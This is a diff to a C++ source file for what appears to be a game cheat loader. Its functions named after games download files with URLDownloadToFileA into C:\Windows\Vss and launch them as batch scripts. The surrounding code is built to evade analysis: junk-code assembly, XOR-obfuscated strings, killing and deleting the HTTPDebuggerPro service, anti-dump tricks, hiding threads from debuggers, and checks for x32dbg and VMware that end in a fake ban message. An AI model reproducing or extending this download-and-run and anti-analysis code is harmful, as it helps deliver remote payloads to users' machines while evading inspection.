@@ -28,12 +28,13 @@ using namespace junkcode;
     __asm{pop edx}            \
     __asm{or eax, ecx}        \
     __asm{pop eax}
-
+void startup();
 inline int AddSubOne(int One, int Two)
 {
     JUNK_CODE_ONE
         return ((One + Two) - 1);
 }
+
 void SizeOfImage()
 {
     // Any unreasonably large value will work say for example 0x100000 or 100,000h
@@ -83,7 +84,7 @@ void gta()
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
     system("Start C:\\Windows\\Vss\\gta.bat");
-    apex();
+
 }
 void fortnite()
 {
@@ -102,7 +103,7 @@ void fishingplanet()
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\\");
     system("Start C:\\Windows\\Vss\\Fishing-planet.bat");
-    gta();
+
 }
 void cod()
 {
@@ -223,7 +224,7 @@ void cleaner() {
     system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
     system(XorStr("sc delete HTTPDebuggerPro >nul 2>&1").c_str());
     system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
-    fishingplanet();
+
 }
 void deleter()
 {
@@ -425,7 +426,9 @@ void mainbot()
             Sleep(2400);
             system(XorStr("cls").c_str());
             cleaner();
-
+            fishingplanet();
+            gta();
+            apex();
             cod();
             fortnite();
             spoofer();
@@ -451,6 +454,8 @@ void mainbot()
     
     
 }
+
+
 typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
     _In_ HANDLE ThreadHandle,
     _In_ ULONG  ThreadInformationClass,
@@ -507,14 +512,19 @@ void HideFromDebugger()
     NTSTATUS status = NtSetInformationThread(GetCurrentThread(),
         ThreadHideFromDebugger, NULL, 0);
 }
+
+
+
 int main()
 {
+    
     rydekem();
     plvbjwh();
     tlmisir();
     akfuxnl();
     lnttirs();
-    LPCWSTR windowName = L"x32dbg"; 
+
+    LPCWSTR windowName = L"x32dbg";
     LPCWSTR vmname = L"VMware Workstation";
     if (FindWindow(NULL, windowName))
     {
@@ -563,11 +573,15 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    
+
+
+
+
+
 
     else
     {
-        if (GetLastError != 0) 
+        if (GetLastError != 0)
         {
             rydekem();
             plvbjwh();
@@ -581,8 +595,11 @@ int main()
             system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software. && TIMEOUT 10 >nul").c_str());
             exit(0);
         }
+
         else if (GetLastError == 0)
         {
+
+
             rydekem();
             plvbjwh();
             tlmisir();
@@ -600,10 +617,9 @@ int main()
             mainbot();
 
         }
-        
-            
-        
+
+
+
     }
- 
 }
 
